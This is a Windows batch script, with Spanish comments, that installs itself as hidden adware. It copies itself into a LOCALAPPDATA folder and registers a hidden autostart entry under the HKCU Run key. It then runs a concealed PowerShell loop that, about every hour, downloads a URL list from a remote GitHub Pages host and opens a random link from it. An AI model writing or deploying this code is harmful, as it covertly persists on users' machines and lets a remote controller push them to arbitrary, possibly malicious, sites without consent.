@echo off
set "CARPETA_ADS=%LOCALAPPDATA%\ADS"
set "BAT_DESTINO=%CARPETA_ADS%\rotador_ads.bat"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=RotadorAdsPS"
set "PS_LOOP=while ($true) { try { $resp = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing; $urls = $resp.Content -split \"`r?`n\" | Where-Object { $_ -match '^https?://' } | ForEach-Object { ($_ -split '\|\|\|')[0].Trim() } | Where-Object { $_ -ne '' }; if ($urls.Count -gt 0) { $elegida = Get-Random -InputObject $urls; Start-Process -FilePath $elegida } } catch {}; Start-Sleep -Seconds 3500 }"

REM 1. Si rotador_ads.bat ya existe en %LOCALAPPDATA%\ADS, omitir; si no, crear carpeta y copiarlo
if not exist "%BAT_DESTINO%" (
    if not exist "%CARPETA_ADS%" (
        mkdir "%CARPETA_ADS%" >nul 2>&1
    )
    copy /y "%~f0" "%BAT_DESTINO%" >nul 2>&1
)

REM 2. Registrar en HKCU\...\Run para abrir el .bat dentro de %LOCALAPPDATA%\ADS al iniciar Windows
reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
if errorlevel 1 (
    reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden\"" /f >nul
)

REM 3. Si se lanzo desde fuera de %LOCALAPPDATA%\ADS, abrir el bat de destino y salir
if /i not "%~f0"=="%BAT_DESTINO%" (
    start "" /min powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden"
    exit
)

REM 4. Iniciar bucle en PowerShell (abre el primer ads al arrancar y luego repite cada 3600s = 1 hora)
powershell.exe -NoProfile -WindowStyle Hidden -Command "%PS_LOOP%"
exit
